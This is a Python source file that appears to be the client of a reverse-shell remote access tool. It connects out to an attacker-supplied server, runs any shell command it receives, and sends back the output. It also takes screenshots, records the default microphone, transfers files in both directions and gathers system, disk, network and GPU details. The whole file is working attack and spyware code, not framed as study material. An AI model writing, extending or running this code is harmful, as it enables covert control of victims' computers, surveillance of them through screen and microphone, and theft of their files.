import socket
import os
import subprocess
import sys
import re
import platform
from datetime import datetime

import tqdm
try:
    import pyautogui
except KeyError:
    # for some machine that do not have display (i.e cloud Linux machines)
    # simply do not import
    pyautogui_imported = False
else:
    pyautogui_imported = True
import sounddevice as sd
from tabulate import tabulate
from scipy.io import wavfile
import psutil
import GPUtil


SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1440 # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"


class Client:
    
    def __init__(self, host, port, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        # connect to the server
        self.socket = self.connect_to_server()
        # the current working directory
        self.cwd = None

    def connect_to_server(self, custom_port=None):
        # create the socket object
        s = socket.socket()
        # connect to the server
        if custom_port:
            port = custom_port
        else:
            port = self.port
        if self.verbose:
            print(f"Connecting to {self.host}:{port}")
        s.connect((self.host, port))
        if self.verbose:
            print("Connected.")
        return s
    
    def start(self):
        # get the current directory
        self.cwd = os.getcwd()
        self.socket.send(self.cwd.encode())
        
        while True:
            # receive the command from the server
            command = self.socket.recv(BUFFER_SIZE).decode()
            # execute the command
            output = self.handle_command(command)
            if output == "abort":
                # break out of the loop if "abort" command is executed
                break
            elif output in ["exit", "quit"]:
                continue
            # get the current working directory as output
            self.cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{self.cwd}"
            self.socket.sendall(message.encode())
            
        # close client connection
        self.socket.close()

    def handle_command(self, command):
        if self.verbose:
            print(f"Executing command: {command}")
        if command.lower() in ["exit", "quit"]:
            output = "exit"
        elif command.lower() == "abort":
            output = "abort"
        elif (match := re.search(r"cd\s*(.*)", command)):
            output = self.change_directory(match.group(1))
        elif (match := re.search(r"screenshot\s*(\w*)", command)):
            # if pyautogui is imported, take a screenshot & save it to a file
            if pyautogui_imported:
                output = self.take_screenshot(match.group(1))
            else:
                output = "Display is not supported in this machine."
        elif (match := re.search(r"recordmic\s*([a-zA-Z0-9]*)(\.[a-zA-Z]*)\s*(\d*)", command)):
            # record the default mic
            audio_filename = match.group(1) + match.group(2)
            try:
                seconds = int(match.group(3))
            except ValueError:
                # seconds are not passed, going for 5 seconds as default
                seconds = 5
            output = self.record_audio(audio_filename, seconds=seconds)
        elif (match := re.search(r"download\s*(.*)", command)):
            # get the filename & send it if it exists
            filename = match.group(1)
            if os.path.isfile(filename):
                output = f"The file {filename} is sent."
                self.send_file(filename)
            else:
                output = f"The file {filename} does not exist"
        elif (match := re.search(r"upload\s*(.*)", command)):
            # receive the file
            filename = match.group(1)
            output = f"The file {filename} is received."
            self.receive_file()
        elif (match := re.search(r"sysinfo.*", command)):
            # extract system & hardware information
            output = Client.get_sys_hardware_info()
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        return output
    
    def change_directory(self, path):
        if not path:
            # path is empty, simply do nothing
            return ""
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
        return output
    
    def take_screenshot(self, output_path):
        # take a screenshot using pyautogui
        img = pyautogui.screenshot()
        if not output_path.endswith(".png"):
            output_path += ".png"
        # save it as PNG
        img.save(output_path)
        output = f"Image saved to {output_path}"
        if self.verbose:
            print(output)
        return output
    
    def record_audio(self, filename, sample_rate=16000, seconds=3):
        # record audio for `seconds`
        if not filename.endswith(".wav"):
            filename += ".wav"
        myrecording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=2)
        sd.wait()  # Wait until recording is finished
        wavfile.write(filename, sample_rate, myrecording)  # Save as WAV file 
        output = f"Audio saved to {filename}"
        if self.verbose:
            print(output)
        return output
    
    def receive_file(self, port=5002):
        # connect to the server using another port
        s = self.connect_to_server(custom_port=port)
        # receive the actual file
        Client._receive_file(s, verbose=self.verbose)
        
    def send_file(self, filename, port=5002):
        # connect to the server using another port
        s = self.connect_to_server(custom_port=port)
        # send the actual file
        Client._send_file(s, filename, verbose=self.verbose)
    
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096, verbose=False):
        # receive the file infos using socket
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        # remove absolute path if there is
        filename = os.path.basename(filename)
        # convert to integer
        filesize = int(filesize)
        # start receiving the file from the socket
        # and writing to the file stream
        if verbose:
            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        else:
            progress = None
        with open(filename, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = s.recv(buffer_size)
                if not bytes_read:    
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                if verbose:
                    # update the progress bar
                    progress.update(len(bytes_read))
        # close the socket
        s.close()
    
    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
        # get the file size
        filesize = os.path.getsize(filename)
        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        # start sending the file
        if verbose:
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        else:
            progress = None
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                s.sendall(bytes_read)
                if verbose:
                    # update the progress bar
                    progress.update(len(bytes_read))
        # close the socket
        s.close()
        
    @classmethod
    def get_sys_hardware_info(cls):
    
        def get_size(bytes, suffix="B"):
            """
            Scale bytes to its proper format
            e.g:
                1253656 => '1.20MB'
                1253656678 => '1.17GB'
            """
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor
        
        output = ""
        output += "="*40 + "System Information" + "="*40 + "\n"
        uname = platform.uname()
        output += f"System: {uname.system}\n"
        output += f"Node Name: {uname.node}\n"
        output += f"Release: {uname.release}\n"
        output += f"Version: {uname.version}\n"
        output += f"Machine: {uname.machine}\n"
        output += f"Processor: {uname.processor}\n"
        # Boot Time
        output += "="*40 + "Boot Time" + "="*40 + "\n"
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        output += f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n"
        # let's print CPU information
        output += "="*40 + "CPU Info" + "="*40 + "\n"
        # number of cores
        output += f"Physical cores: {psutil.cpu_count(logical=False)}\n"
        output += f"Total cores: {psutil.cpu_count(logical=True)}\n"
        # CPU frequencies
        cpufreq = psutil.cpu_freq()
        output += f"Max Frequency: {cpufreq.max:.2f}Mhz\n"
        output += f"Min Frequency: {cpufreq.min:.2f}Mhz\n"
        output += f"Current Frequency: {cpufreq.current:.2f}Mhz\n"
        # CPU usage
        output += "CPU Usage Per Core:\n"
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            output += f"Core {i}: {percentage}%\n"
        output += f"Total CPU Usage: {psutil.cpu_percent()}%\n"
        # Memory Information
        output += "="*40 + "Memory Information" + "="*40 + "\n"
        # get the memory details
        svmem = psutil.virtual_memory()
        output += f"Total: {get_size(svmem.total)}\n"
        output += f"Available: {get_size(svmem.available)}\n"
        output += f"Used: {get_size(svmem.used)}\n"
        output += f"Percentage: {svmem.percent}%\n"
        output += "="*20 + "SWAP" + "="*20 + "\n"
        # get the swap memory details (if exists)
        swap = psutil.swap_memory()
        output += f"Total: {get_size(swap.total)}\n"
        output += f"Free: {get_size(swap.free)}\n"
        output += f"Used: {get_size(swap.used)}\n"
        output += f"Percentage: {swap.percent}%\n"
        # Disk Information
        output += "="*40 + "Disk Information" + "="*40 + "\n"
        output += "Partitions and Usage:\n"
        # get all disk partitions
        partitions = psutil.disk_partitions()
        for partition in partitions:
            output += f"=== Device: {partition.device} ===\n"
            output += f"  Mountpoint: {partition.mountpoint}\n"
            output += f"  File system type: {partition.fstype}\n"
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                # this can be catched due to the disk that
                # isn't ready
                continue
            output += f"  Total Size: {get_size(partition_usage.total)}\n"
            output += f"  Used: {get_size(partition_usage.used)}\n"
            output += f"  Free: {get_size(partition_usage.free)}\n"
            output += f"  Percentage: {partition_usage.percent}%\n"
        # get IO statistics since boot
        disk_io = psutil.disk_io_counters()
        output += f"Total read: {get_size(disk_io.read_bytes)}\n"
        output += f"Total write: {get_size(disk_io.write_bytes)}\n"
        # Network information
        output += "="*40 + "Network Information" + "="*40 + "\n"
        # get all network interfaces (virtual and physical)
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                output += f"=== Interface: {interface_name} ===\n"
                if str(address.family) == 'AddressFamily.AF_INET':
                    output += f"  IP Address: {address.address}\n"
                    output += f"  Netmask: {address.netmask}\n"
                    output += f"  Broadcast IP: {address.broadcast}\n"
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    output += f"  MAC Address: {address.address}\n"
                    output += f"  Netmask: {address.netmask}\n"
                    output += f"  Broadcast MAC: {address.broadcast}\n"
        # get IO statistics since boot
        net_io = psutil.net_io_counters()
        output += f"Total Bytes Sent: {get_size(net_io.bytes_sent)}\n"
        output += f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n"
        # GPU information
        output += "="*40 + "GPU Details" + "="*40 + "\n"
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            # get the GPU id
            gpu_id = gpu.id
            # name of GPU
            gpu_name = gpu.name
            # get % percentage of GPU usage of that GPU
            gpu_load = f"{gpu.load*100}%"
            # get free memory in MB format
            gpu_free_memory = f"{gpu.memoryFree}MB"
            # get used memory
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            # get total memory
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            # get GPU temperature in Celsius
            gpu_temperature = f"{gpu.temperature} °C"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature, gpu_uuid
            ))
        output += tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                        "temperature", "uuid"))
        return output
    

if __name__ == "__main__":
    # while True:
    #     # keep connecting to the server forever
    #     try:
    #         client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
    #         client.start()
    #     except Exception as e:
    #         print(e)
    client = Client(SERVER_HOST, SERVER_PORT)
    client.start()
